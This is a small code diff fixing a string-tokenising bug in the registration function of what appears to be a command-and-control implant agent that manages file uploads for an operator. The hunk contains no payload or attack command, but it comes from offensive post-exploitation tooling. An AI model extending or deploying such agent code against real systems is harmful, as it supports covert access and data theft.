@@ -73,7 +73,7 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 
 void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *name = MSVCRT$strtok(task->parameters, " ");
-	char *uuid = MSVCRT$strtok(task->parameters, " ");
+	char *uuid = MSVCRT$strtok(NULL, " ");
 
 	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, uuid);
 	
